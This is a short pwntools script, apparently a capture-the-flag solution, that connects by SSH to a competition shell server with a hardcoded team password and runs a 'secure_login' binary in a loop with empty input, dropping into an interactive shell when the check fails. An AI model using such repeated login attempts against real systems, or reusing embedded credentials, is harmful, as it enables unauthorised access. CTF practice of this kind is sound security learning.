from pwn import *

s = ssh(host='shell.actf.co', user='team8292', password="8ca88847c709fb4d0df2")

for i in range(255):
    sh = s.process('./login', cwd='/problems/2021/secure_login')
    p =""
    sh.sendline(p)
    sh.recvline()
    data = sh.recvline()
    print data
    if "Wrong!" not in data:
        print "wrong"
        sh.interactive()

    sh.close()

# sh = process("./login")
#
# p ='1-10'
# sh.sendlineafter("service!\n",p)
#
# sh.interactive()
